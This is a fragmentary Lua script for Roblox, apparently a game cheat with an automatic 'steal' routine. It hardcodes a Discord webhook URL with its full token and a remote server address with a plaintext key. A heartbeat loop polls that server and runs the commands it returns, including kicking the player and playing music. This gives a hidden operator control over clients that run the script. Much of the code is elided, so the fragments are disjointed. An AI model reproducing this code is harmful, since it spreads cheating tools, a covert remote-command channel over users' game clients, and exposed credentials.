...
_G.__AceSetupNormalAutoSteal = function()
    ...
    local function executeSteal(prompt)
        ...
        local pauseFraction = (function()
            if _G.VisStealPause == true or (St and St.stealPause == true) then
        ...
        task.spawn(function()
            ...
            if isCloseEnoughToGrab() or (not (_G.VisStealPause == true or (St and St.stealPause == true))) then
...
do
	...
	local WIN_LIVE_HOOK = "https://discord.com/api/webhooks/1540172509373136896/XBraxO3ncHfxvpXLLwFjxvCdee_V0u63Eykvqx_EEuSXSSe__j2ZZS7amsxsTp_scZUh"
...
do
    local BASE   = "https://vishubblagger.lovable.app"
    local KEY    = "Grin@1234"
    ...
    -- Phát / đổi âm lượng / tắt nhạc bằng ID Roblox
    ...
    function heartbeat()
        ...
        for _, cmd in ipairs(data.commands or {}) do
            ...
            if cmd.type == "kick" then
                local reason = p.reason or "Bạn đã bị kick."
